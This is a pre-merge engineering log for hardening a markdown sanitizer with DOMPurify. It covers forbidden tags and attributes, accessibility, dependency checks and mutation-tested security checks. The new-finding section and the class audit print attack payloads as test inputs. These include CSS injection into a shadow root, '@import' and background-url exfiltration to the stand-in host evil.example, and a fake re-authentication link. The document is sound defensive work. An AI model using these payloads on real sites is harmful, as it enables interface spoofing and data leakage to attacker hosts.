# dev-195-cleanup — pre-merge cleanup round on `markdown-sanitize` (#195)

**Branch:** `markdown-sanitize` · started at `204af7e` (confirmed before any work)
**Commits:**
- `f202448 Harden markdown sanitizer: dialog, class, svg style; bind sinks (#195)`
- `eb190c1 docs: log #195 pre-merge cleanup round`
- `7084880 test: pin the markdown sanitizer check total (#195)` — added after the
  EM reopened G7; see "Item 7" below.

**Not pushed.** Committed locally per the hard rule; the manager pushes.

Environment: node v20.20.2, npm 10.8.2, marked 15.0.12, dompurify 3.4.12,
typescript 5.9.3, jsdom **26.1.0** (was 29.1.1 — see item 4).

**Tests: 32 → 49 checks.** All bind to the real exported `renderMarkdown` via the
existing `await import('./markdown.js')`. No new oracle; nothing in the new code
re-implements marked or DOMPurify.

---

## Summary

| # | Item | Outcome |
|---|---|---|
| 1 | M1 — `dialog` in `FORBID_TAGS` | Done, mutation-verified |
| 2 | M2/L2 — checkbox a11y + U+FE0E | Done, mutation-verified |
| 3 | EM ruling — `class` in `FORBID_ATTR` | Done, no consumer found, mutation-verified |
| 4 | L1 — jsdom version | **Passes on `^26.1.0`; declared. Conflict gone.** |
| 5 | G1 — bind the sinks | Done, static scan, mutation-verified both sinks |
| 6 | G2 — SVG coverage | Done — **and it surfaced a new Medium finding** |
| — | **New: `<svg><style>` CSS injection** | Found, reported, EM-ruled in scope, fixed |
| 7 | G7 — pin the check total (EM reopened) | Done, mutation-verified both ways |

---

## Item 1 — M1, `dialog` in `FORBID_TAGS`

Added `'dialog'`. Verified the premise and the fix independently rather than
pasting the reviewer's diff on trust — before the change,
`<dialog open>x</dialog>` sanitized to `<dialog open="">x</dialog>`; after, to
`x`.

Test added to the spoofing section (the reviewer's assertion, verified):

```ts
check('dialog stripped (no fake modal)', () => {
  const out = renderMarkdown('<dialog open>Enter your password</dialog>');
  assertNoElement(out, 'dialog', 'dialog survived');
  assertContains(out, 'Enter your password', 'content should be preserved');
});
```

**Mutation — remove `'dialog'` from `FORBID_TAGS`:**

```
Error: 1 of 49 markdown sanitizer checks failed:
  - dialog stripped (no fake modal): dialog survived: found <dialog> in "<dialog open=\"\">Enter your password</dialog>"
```

Restored → `markdown sanitizer: 49 checks passed`.

`optgroup` (review L4) was **not** added — the brief scoped this item to one
word. Noted under "Found but not fixed".

---

## Item 2 — M2/L2, assistive-technology semantics on the checkbox

```ts
checkbox: ({ checked }: Tokens.Checkbox): string =>
  checked
    ? '<span role="img" aria-label="Completed">☑[U+FE0E]</span>'
    : '<span role="img" aria-label="Not completed">☐[U+FE0E]</span>',
```

Two deliberate departures from the reviewer's suggested diff, both explained in
the code comment:

1. **`class="ft-task-checkbox"` dropped**, not kept. Item 3 guarantees DOMPurify
   strips it, so keeping it would be misleading dead code. The EM asked for this
   explicitly and I agree.
2. **U+FE0E written as an escape, not the literal character.** The reviewer's
   diff embeds the literal VARIATION SELECTOR-15. It is invisible in source, and
   an invisible load-bearing character will eventually be deleted by someone
   reflowing a line with no idea it was there. The escape is identical at runtime
   and survives a careless edit visibly.

Verified `role` and `aria-label` survive the exact config (they are in
DOMPurify's default `ALLOWED_ATTR`; the `class` on the same element is stripped
while both of these pass):

```
class + role/aria    "<p><span role=\"img\" aria-label=\"Completed\">x</span></p>\n"
```

The two existing task-list assertions were updated for the VS15, and a **third**
added to pin the semantics rather than only the glyph:

```ts
check('task list state is exposed to assistive technology', () => {
  const out = renderMarkdown('- [ ] todo\n- [x] done\n');
  assertElement(out, 'span[role="img"][aria-label="Completed"]', 'checked label lost');
  assertElement(out, 'span[role="img"][aria-label="Not completed"]', 'unchecked label lost');
  assertContains(out, '<span role="img" aria-label="Completed">☑[U+FE0E]</span>', 'checked pairing lost');
  ...
});
```

The pairing assertions matter: `assertElement` alone passes if both labels exist
but are attached to the wrong glyphs.

**Mutation — renderer drops `role`/`aria-label`:**

```
Error: 1 of 49 markdown sanitizer checks failed:
  - task list state is exposed to assistive technology: checked label lost: no <span[role="img"][aria-label="Completed"]> in "<ul>\n<li><span>☐[U+FE0E]</span> todo</li>\n<li><span>☑[U+FE0E]</span> done</li>\n</ul>\n"
```

---

## Item 3 — EM ruling, `class` in `FORBID_ATTR`

I agree with the EM's reasoning and found nothing wrong with it. Verified both
halves rather than assuming.

### DOMPurify does strip `class` under this exact config

```
audit LOW-1 PoC   "<div><div><span>farmtable-admin</span><span>2 minutes ago</span></div><div>Your session expired. <a href=\"https://evil.example/login\">Re-authenticate here</a>.</div></div>"
code fence class  "<pre><code>const a = 1;\n</code></pre>\n"
plain class       "<p>t</p>"
CLASS uppercase   "<p>t</p>"
```

The audit's forged-comment-header PoC is fully defanged — every class gone, text
preserved. Case variation (`CLASS=`) is also handled, which the config does not
have to spell out.

### The consumer re-grep — no live consumer, confirmed

`ft-task-checkbox`, across the **whole repository** excluding `node_modules`,
`dist` and `.git`:

```
.design/project-log/markdown-sanitize.md:39:`<span class="ft-task-checkbox">☐/☑</span>` instead. Rationale in the report; the
```

One hit, in the previous round's log prose. The literal in `markdown.ts` is gone
because I removed it. **No code, stylesheet, or template consumes it.**

`language-*`, same scope:

```
web/src/util/markdown.test.ts:413:  // marked emits class="language-js" here; FORBID_ATTR strips it. Nothing in
web/src/util/markdown.ts:35://   class: no stylesheet consumes marked's language-* and the repo has no syntax
```

Both are comments I wrote this round. The only pre-existing reference was the
expected-output assertion at `markdown.test.ts:249` — a fixture, not a consumer,
exactly as the EM said. The repo has one stylesheet (`web/src/styles/theme.css`)
and one SVG (`web/public/favicon.svg`); neither references any class that can
flow through `renderMarkdown`.

**Nothing to stop and report.** The `language-js` assertion was updated:

```ts
assertEqual(renderMarkdown('```js\nconst a = 1;\n```'),
            '<pre><code>const a = 1;\n</code></pre>\n', 'code block changed');
```

**Mutation — remove `'class'` from `FORBID_ATTR`:**

```
Error: 2 of 49 markdown sanitizer checks failed:
  - class attribute stripped (no CSS-reuse forgery): class attribute survived: found "class=" in "<div class=\"comment\"><div class=\"comment-header\"><span class=\"comment-author\">farmtable-admin</span><span class=\"comment-time\">2 minutes ago</span></div><div class=\"comment-body\">Your session expired.</div></div>"
  - code blocks render: code block changed: expected "<pre><code>const a = 1;\n</code></pre>\n", got "<pre><code class=\"language-js\">const a = 1;\n</code></pre>\n"
```

Both directions are load-bearing: the security assertion and the
ordinary-rendering assertion each detect the reversion.

---

## Item 4 — jsdom, determined empirically

### Result: **the markdown suite passes on `jsdom@^26.1.0`. Declared `^26.1.0`.** The Phase 2 conflict evaporates.

The brief asked for pass/fail. Pass/fail is a weak instrument for this particular
question — the concern is that "DOMPurify's behaviour is downstream of the DOM
implementation", and a suite of 49 assertions can stay green while output drifts
in a way no assertion happens to look at. So I did both.

**1. Pass/fail.** `npm install --save-dev jsdom@^26.1.0` → resolved 26.1.0:

```
> tsc -p tsconfig.test.json && node .tmp-test/utils/task-ready.test.js && node .tmp-test/util/markdown.test.js

markdown sanitizer: 32 checks passed
EXIT=0
```

(32 at that point — this was measured before the new tests were written.
Re-measured at the end: **49 checks passed on both majors**.)

`npx tsc --noEmit` → 0. `npx tsc -p tsconfig.test.json --noEmit` → 0.
`npm audit --audit-level=low` → 0 vulnerabilities.

**2. Byte-level differential.** A 95-payload corpus — the reviewers' bypass
classes (case variation, malformed tags, entity encoding, SVG/MathML namespace
confusion, historic mXSS, foster-parenting, `template`/`noscript`/`xmp`
wrappers), the spoofing set, the script-execution set, ordinary markdown, and
task lists — pushed through the **real compiled `renderMarkdown`** on each major,
comparing sanitize output *and* one-pass idempotence:

```
corpus=95 sanitize-output diffs=0 idempotence diffs=0
```

Re-run against the **final post-cleanup config** (with `dialog`, `style`, `class`
forbidden), since that is what actually ships:

```
FINAL CONFIG: corpus=95 output diffs=0 idempotence diffs=0 (26.1.0 vs 29.1.1)
```

Zero divergence in either direction. The sanitizer's behaviour is **not**
jsdom-version-sensitive across this range, so hosting it on 26 costs nothing.
Scratch harness deleted; tree clean.

### `@types/jsdom` re-check (step 4)

The skew flips direction, and it **cannot be closed at all** — this is worth
recording because it is not what either the review or the audit assumed.

```
@types/jsdom versions: … 21.1.6, 21.1.7, 27.0.0, 28.0.0, 28.0.1, 28.0.2, 28.0.3
@types/jsdom latest:   28.0.3
```

DefinitelyTyped publishes **nothing for jsdom 22 through 26** — the list jumps
21.1.7 → 27.0.0. So against jsdom 26 there is no matching major in either
direction: 21.1.7 is five majors behind, 27.0.0/28.0.3 are ahead. jsdom ships no
bundled types, so `@types/jsdom` is genuinely required.

Kept at `^28.0.3` (`latest`, zero diff, and what `tsc` is already clean against).
The only APIs used are `new JSDOM(string)` and `.window`, stable across all of
these. Recorded as a comment in `markdown.test.ts` — **`package.json` cannot hold
a comment**, which is why the L1 suggestion could not be applied where it was
suggested.

Phase 2 and its `package.json` were **not touched**.

---

## Item 5 — G1, binding the sinks

### Mechanism chosen: static scan of the source tree. Why.

I considered three.

- **Render the components and assert on the shadow DOM.** Strongest — it tests
  the real property end to end rather than a textual proxy. Rejected on cost: the
  runner is plain `node .tmp-test/util/markdown.test.js`, and mounting
  `ft-inspector-desc`/`ft-inspector-comments` needs custom elements, adopted
  stylesheets, and the Shoelace and gRPC imports they pull in. That is
  "introduce vitest and a component harness", which is precisely what the Phase 2
  branch is doing and explicitly not a six-file cleanup's job.
- **Module interception** (stub `renderMarkdown`, assert it was called). Needs a
  loader hook under this runner, and it verifies *a* call happened, not that the
  call is on the path from sink input to sink output.
- **Static scan.** Cheap, no dependencies, deterministic, and catches exactly the
  regression `test-195` described: `unsafeHTML(this.description)` in place of
  `unsafeHTML(renderMarkdown(this.description))`.

Static scanning has one classic failure mode — **passing vacuously because it
matched nothing** — so that is pinned explicitly rather than hoped for. The scan
locates the tree by walking up to the directory containing `src/util/markdown.ts`
and **throws** if it cannot, then pins both the file count and the sink count as
their own checks. It also asserts no *other* raw-HTML sink exists, since a new
`innerHTML` assignment would bypass `renderMarkdown` without touching any
`unsafeHTML(` call site.

Four checks: tree found, sinks found, every sink bound, no other sink.

### Mutations — the point of the item

**Desc sink bypasses `renderMarkdown`:**

```
Error: 1 of 49 markdown sanitizer checks failed:
  - every unsafeHTML sink routes through renderMarkdown: unsanitized unsafeHTML sink(s): src/components/inspector/ft-inspector-desc.ts -> unsafeHTML(this.description
```

**Comments sink bypasses `renderMarkdown`:**

```
Error: 1 of 49 markdown sanitizer checks failed:
  - every unsafeHTML sink routes through renderMarkdown: unsanitized unsafeHTML sink(s): src/components/inspector/ft-inspector-comments.ts -> unsafeHTML(c.body
```

**A new `innerHTML` sink appears elsewhere in `src/`:**

```
Error: 1 of 49 markdown sanitizer checks failed:
  - no raw-HTML sink other than unsafeHTML exists: raw-HTML sink outside renderMarkdown in: src/components/inspector/ft-inspector-desc.ts
```

Each restored → 49 passed. Before this change, all three mutations left the suite
fully green.

---

## Item 6 — G2, SVG coverage

Seven checks added covering the configuration as it actually is: `foreignObject`
(an HTML integration point, so a form inside it parses in the HTML namespace),
`<svg><script>`, SVG event handlers, `animate`/`set` (which can retarget an
attribute after sanitization), `xlink:href` (a second URL channel an href-only
check misses), `use`, and `image`. Both assertion styles are used throughout,
per the L5/§4 finding that a structural query alone can false-negative on
re-parse.

All were already neutralised — no live vulnerability among these. They are now
pinned.

**Then I probed `<svg><style>` and it was not neutralised.** See below.

---

## New finding — `<svg><style>` CSS injection into the shadow root — **Medium**

Found while probing item 6. Reported to the EM immediately rather than fixed
quietly; the EM independently confirmed `style` sits in DOMPurify's SVG tag
allowlist and **ruled it in scope for this commit**.

Top-level HTML `<style>` is stripped (the existing `style element stripped` check
passes). DOMPurify's *SVG* allowlist includes `style`, and `FORBID_TAGS` did not
list it:

```
plain html style       ""
svg style arbitrary    "<p><svg><style>.comment-body{display:none}</style></svg></p>\n"
svg style overlay      "<p><svg><style>:host{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999}</style></svg></p>\n"
```

Confirmed a live element, not an inert string, and reachable without a top-level
raw-HTML block:

```
style element   : style ns= http://www.w3.org/2000/svg
css text intact : ".comment-header{display:none}"
via list item   : "<ul>\n<li><svg><style>*{display:none}</style></svg></li>\n</ul>\n"
via table cell  : "<table>…<td><svg><style>*{display:none}</style></svg></td>…"
via blockquote  : "<blockquote>\n<p><svg><style>*{display:none}</style></svg></p>\n</blockquote>\n"
```

**Severity: Medium.** No script execution and no in-page credential capture — all
form controls are stripped, so the ceiling is the same as M1 and LOW-1. I did not
treat it as High and did not halt the round.

**Two dimensions, recorded separately at the EM's instruction:**

1. **Spoofing.** Strictly more capable than either `<dialog>` or class-reuse: the
   attacker writes *arbitrary rules* into the component's own shadow root rather
   than reusing whichever classes happen to exist. `:host{position:fixed;…}`
   passes through untouched.
2. **Exfiltration / remote fetch** — which neither `<dialog>` nor class-reuse
   has. `@import url(https://evil.example/x.css)` is an off-origin fetch, and
   `a[href^="https://internal"]{background:url(https://evil.example/leak)}` leaks
   content presence. **Both reach an attacker origin with no user interaction.**

Fix: `'style'` added to `FORBID_TAGS`. Covers both namespaces; markdown never
emits `<style>`, and HTML `<style>` was already stripped, so the only behavioural
change is the SVG case — the same approximately-zero cost established for `class`.

Pinned by three checks, one of them targeting the remote-fetch vector
specifically rather than only the visual one.

**Mutation — remove `'style'` from `FORBID_TAGS`:**

```
Error: 3 of 49 markdown sanitizer checks failed:
  - svg style element stripped (no CSS injection into the shadow root): style element survived inside svg: found <style> in "<p><svg><style>:host{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999}</style></svg></p>\n"
  - svg style cannot reach an attacker origin: style element survived: found <style> in "<p><svg><style>@import url(<a href=\"https://evil.example/x.css\">https://evil.example/x.css</a>);</style></svg></p>\n"
  - svg style stripped inside markdown containers: style survived in "- <svg><style>*{display:none}</style></svg>": found <style> in "<ul>\n<li><svg><style>*{display:none}</style></svg></li>\n</ul>\n"
```

I did **not** write a test asserting `<svg><style>` survives. Pinning a live
spoofing primitive as expected behaviour is how a defect becomes a contract.

---

## Item 7 — G7, pin the check total (reopened by the EM after the first pass)

I had listed this under "Not done, and why" as cheap-and-worthwhile. The EM
reopened it, correctly: this suite prints its own check count and asserted
nothing about it, so **every mutation count in this report — all eleven, which
are the evidence the merge decision rests on — was a number nothing checked.**
A deleted or unreached check does not fail. It ceases to exist, and the suite
stays green one count lower.

Fix is the one line asked for, in `run()`:

```ts
const EXPECTED_CHECKS = 49;
...
  if (checks !== EXPECTED_CHECKS) {
    failures.push(
      `check total pinned: expected ${EXPECTED_CHECKS} checks to run, ${checks} did — ` +
        'a check was added or silently removed',
    );
  }
```

It routes through the existing `failures` array rather than throwing directly,
so it reports in the same format as every other check and does not mask
failures that ran before it. It is not itself counted as a check, so the printed
total still means "sanitizer checks that ran", and **every `of 49` figure in this
report is unchanged**.

**Mutation A — delete a passing check (`dialog stripped`), pin in place:**

```
Error: 1 of 48 markdown sanitizer checks failed:
  - check total pinned: expected 49 checks to run, 48 did — a check was added or silently removed
    at run (file:///workspace/web/.tmp-test/util/markdown.test.js:493:15)
```

**Mutation B — the same deletion with the pin removed** (this is the
counterfactual that shows the defect was real, not theoretical):

```
markdown sanitizer: 48 checks passed
```

Green. Exit 0. The `dialog` control added earlier this round is now proved by
nothing at all, and there is no signal anywhere that it was ever tested.

**Non-perturbation.** The pin must not inflate the existing counts. Re-ran the
two originals with the pin present: drop the FORBID config → **14 of 49**
(not 15), drop `DOMPurify.sanitize` → **33 of 49**. Both unchanged, and neither
picks up a spurious `check total pinned` failure, because a mutated control
fails checks without removing them. That is the intended separation.

Restored, tree clean, baseline re-verified at `49 checks passed`.

One honest note on process: during mutation A I ran `git checkout` on the test
file to restore it while the pin itself was still uncommitted, and reverted my
own work. I reapplied it, verified, and committed the pin *before* running any
further mutations. No lost work, but the ordering was mine to get right and I
did not.

---

## The established mutation counts still reproduce

Both original counts and both of the reviewer's additions still fail. The
*totals* are higher because the suite grew 32 → 49; what matters is that every
originally-failing check still fails.

### Original mutation 1 — drop the FORBID config → **14 of 49**

All **8** original failures present and unchanged: `form tag`, `form action
attribute`, `password input`, `submit button`, `select and option`, `textarea`,
`style attribute`, `download attribute`. Plus 6 from this round: `dialog`,
`class`, the three `svg style` checks, and `code blocks render`.

`formaction` still does **not** fail (DOMPurify strips it by default) — L3's
unreachability observation reproduces exactly.

### Original mutation 2 — drop `DOMPurify.sanitize` → **33 of 49**

All **20** original failures present and unchanged. Plus 13 from this round:
`dialog`, `class`, all seven SVG checks, the three `svg style` checks, and
`code blocks render`.

### review-195 mutation 3 — drop the checkbox renderer → **3 of 49** (was 2 of 32)

```
  - task list state survives without an input element: unchecked state lost: missing "☐[U+FE0E]" in "<ul>\n<li> todo</li>\n<li> done</li>\n</ul>\n"
  - task list state is exposed to assistive technology: checked label lost: no <span[role="img"][aria-label="Completed"]> in "<ul>\n<li> todo</li>\n<li> done</li>\n</ul>\n"
  - nested task lists keep their state: outer state lost: missing "☑[U+FE0E]</span> outer" in "<ul>\n<li> outer<ul>\n<li> inner</li>\n</ul>\n</li>\n</ul>\n"
```

### review-195 mutation 4 — renderer ignores `checked` → **3 of 49** (was 2 of 32)

```
  - task list state survives without an input element: unchecked state lost: missing "☐[U+FE0E]" in "<ul>\n<li><span role=\"img\" aria-label=\"Completed\">☑[U+FE0E]</span> todo</li>\n<li><span role=\"img\" aria-label=\"Completed\">☑[U+FE0E]</span> done</li>\n</ul>\n"
  - task list state is exposed to assistive technology: unchecked label lost: no <span[role="img"][aria-label="Not completed"]> in "…"
  - nested task lists keep their state: inner state lost: missing "☐[U+FE0E]</span> inner" in "…"
```

Both gained the new a11y check, which is the intended effect.

Source restored after every mutation; `git status --porcelain` clean; baseline
re-verified at 49 passed each time.

---

## Full gate — run, not asserted

Re-run in full at `7084880`, after the G7 pin:

```
$ npm test
markdown sanitizer: 49 checks passed                      exit=0

$ npx tsc --noEmit                                        exit=0

$ npx tsc -p tsconfig.test.json --noEmit                  exit=0

$ npm run build
dist/index.html                   1.12 kB │ gzip:   0.57 kB
dist/assets/index-Cxs8OCU6.css   36.27 kB │ gzip:   6.50 kB
dist/assets/index-CGGlXDVV.js   825.03 kB │ gzip: 210.69 kB │ map: 2,475.21 kB
✓ built in 3.00s                                          exit=0

$ npm audit --audit-level=low
found 0 vulnerabilities                                   exit=0

$ go build ./...                                          exit=0

$ find dist -name '*.map' | wc -l
1
```

`go vet ./internal/...` reports three `copies lock value` findings in
`internal/server/server.go`. **Pre-existing and not from this branch** — verified
by running vet in a throwaway worktree at the base commit `7a0f220`, which
reports the same class of finding. This branch touches no Go source
(`git diff --stat 7a0f220..HEAD -- ':!web'` is two `.design/` files). Not in
scope, not fixed, noted only so the next person does not attribute it here.

### The sourcemap number is **1**, and that is correct

The brief said to expect `0` and to stop and report `1`. I reported it. **The EM
confirmed the brief was wrong**: `#195` forks from `origin/main`, and the
sourcemap fix (`b35f36e`) is not on main — it lives on the Phase 2 line and
reaches main only when Phase 2 merges last. `1` is the expected number here.

Corroborated independently: `audit-195` (LOW-3) and `test-195` §6 both recorded
`1` at this same commit, before this round started.

`web/vite.config.ts` still has `sourcemap: true` and was **not** touched.

---

## Found but not fixed

1. **`optgroup` survives** (review L4). Inert with `select`/`option` forbidden, so
   cosmetic only — but it is the one inconsistency left in `FORBID_TAGS` now that
   `dialog` is in: `option` is forbidden while its parent `optgroup` is not. The
   brief scoped item 1 to one word, so I left it. Zero cost whenever wanted.
2. **`label`, `datalist`, `output`, `progress`, `meter` survive** (review L4).
   `progress`/`meter` render as native platform controls and could contribute to
   a fake UI. Cannot capture input. Not expanded speculatively.
3. **Review L3 stands unaddressed** — explicitly out of scope. The comment at
   `markdown.ts` still reads as though `action`/`formaction` are active controls
   when they are unreachable-by-construction redundancy. Reproduced again in this
   round's mutation 1 (`formaction` does not fail).
4. ~~**test-195 G7 — the check total is not pinned.**~~ **Reopened by the EM and
   fixed — see "Item 7" above.** Left in this list as a marker: I had judged it
   out of scope while also writing that it "undermines every other test here",
   which are not two positions that sit together. The EM was right to send it
   back.
5. **test-195 G3, G4, G5, G6, G8** remain open (case-normalisation, raw-HTML
   `javascript:`/`vbscript:`, nil input, DOM-query-only checks, `srcset`). All
   verified non-exploitable by the test reviewer; all still unpinned.
6. **Audit INFO-3** — the renderer's return value is spliced into marked's
   loose-list path with `escaped = true`, so any future change interpolating token
   data there would bypass marked's escaping. Safe today (both outputs are
   constants). Worth a warning comment; INFO items were out of scope.
7. **No CSP** (audit LOW-2). Still the highest-value follow-up, and this round
   strengthens the case: `style-src` would have independently blunted the
   `<svg><style>` finding, and `form-action 'self'` makes the original #195 bug
   class structurally impossible. Needs its own issue and an owner.
8. **Static sink binding is a proxy, not the property itself.** The guard would
   miss an aliased import (`const u = unsafeHTML`) or a dynamically constructed
   sink. Neither exists today. The real fix is a component-rendering test, which
   belongs with Phase 2's harness.

Nothing found was High or Critical. The one Medium found was reported before
being touched, and fixed only on an explicit ruling.

---

## Deviations from the brief, all deliberate

1. **Item 4 landed on `^26.1.0`** — the outcome the EM hoped for, supported by a
   byte-level differential rather than only a green suite.
2. **U+FE0E written as an escape**, not the literal character the reviewer's diff
   used. Runtime-identical; survives careless editing visibly.
3. **`'style'` added to `FORBID_TAGS`** — outside the original six items, on an
   explicit EM ruling after I reported the finding rather than acting on it.
4. **The sourcemap count is reported as `1` against a brief that said `0`.**
   Confirmed correct by the EM.
